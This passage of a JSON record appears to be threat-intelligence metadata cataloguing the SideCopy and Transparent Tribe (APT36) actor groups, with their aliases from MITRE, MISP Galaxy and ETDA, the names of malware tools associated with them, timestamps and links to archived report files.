                "SideCopy"
            ],
            "source_name": "MITRE:SideCopy",
            "tools": [
                "AuTo Stealer",
                "Action RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "fce5181c-7aab-400f-bd03-9db9e791da04",
            "created_at": "2022-10-25T15:50:23.759799Z",
            "updated_at": "2025-03-27T02:00:55.540135Z",
            "deleted_at": null,
            "main_name": "Transparent Tribe",
            "aliases": [
                "Transparent Tribe",
                "COPPER FIELDSTONE",
                "APT36",
                "Mythic Leopard",
                "ProjectM"
            ],
            "source_name": "MITRE:Transparent Tribe",
            "tools": [
                "DarkComet",
                "ObliqueRAT",
                "njRAT",
                "Peppy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c68fa27f-e8d9-4932-856b-467ccfe39997",
            "created_at": "2023-01-06T13:46:38.450585Z",
            "updated_at": "2025-03-27T02:00:02.836543Z",
            "deleted_at": null,
            "main_name": "Operation C-Major",
            "aliases": [
                "C-Major",
                "Transparent Tribe",
                "Mythic Leopard",
                "ProjectM",
                "APT 36",
                "TMP.Lapis",
                "Green Havildar",
                "COPPER FIELDSTONE",
                "APT36",
                "Earth Karkaddan",
                "Storm-0156"
            ],
            "source_name": "MISPGALAXY:Operation C-Major",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "abb24b7b-6baa-4070-9a2b-aa59091097d1",
            "created_at": "2022-10-25T16:07:24.339942Z",
            "updated_at": "2025-03-27T02:02:10.179404Z",
            "deleted_at": null,
            "main_name": "Transparent Tribe",
            "aliases": [
                "APT 36",
                "APT-C-56",
                "Copper Fieldstone",
                "Earth Karkaddan",
                "Green Havildar",
                "Mythic Leopard",
                "Operation C-Major",
                "Operation Honey Trap",
                "Operation Transparent Tribe",
                "ProjectM",
                "STEPPY-KAVACH",
                "Storm-0156",
                "TEMP.Lapis",
                "Transparent Tribe"
            ],
            "source_name": "ETDA:Transparent Tribe",
            "tools": [
                "Amphibeon",
                "Android RAT",
                "Bezigate",
                "Bladabindi",
                "Bozok",
                "Bozok RAT",
                "BreachRAT",
                "Breut",
                "CapraRAT",
                "CinaRAT",
                "Crimson RAT",
                "DarkComet",
                "DarkKomet",
                "ElizaRAT",
                "FYNLOS",
                "Fynloski",
                "Jorik",
                "Krademok",
                "Limepad",
                "Luminosity RAT",
                "LuminosityLink",
                "MSIL",
                "MSIL/Crimson",
                "Mobzsar",
                "MumbaiDown",
                "Oblique RAT",
                "ObliqueRAT",
                "Peppy RAT",
                "Peppy Trojan",
                "Quasar RAT",
                "QuasarRAT",
                "SEEDOOR",
                "Scarimson",
                "SilentCMD",
                "Stealth Mango",
                "UPDATESEE",
                "USBWorm",
                "Waizsar RAT",
                "Yggdrasil",
                "beendoor",
                "klovbot",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a4f0e383-f447-4cd6-80e3-ffc073ed4e00",
            "created_at": "2023-01-06T13:46:39.30167Z",
            "updated_at": "2025-03-27T02:00:03.045082Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [],
            "source_name": "MISPGALAXY:SideCopy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1706666774,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1706595114,
    "ts_modification_date": 1706595114,
    "files": {
        "pdf": "https://archive.orkl.eu/4890934ae6fa2e26959574d125ffeb519784672d.pdf",
        "text": "https://archive.orkl.eu/4890934ae6fa2e26959574d125ffeb519784672d.txt",
        "img": "https://archive.orkl.eu/4890934ae6fa2e26959574d125ffeb519784672d.jpg"
    }
}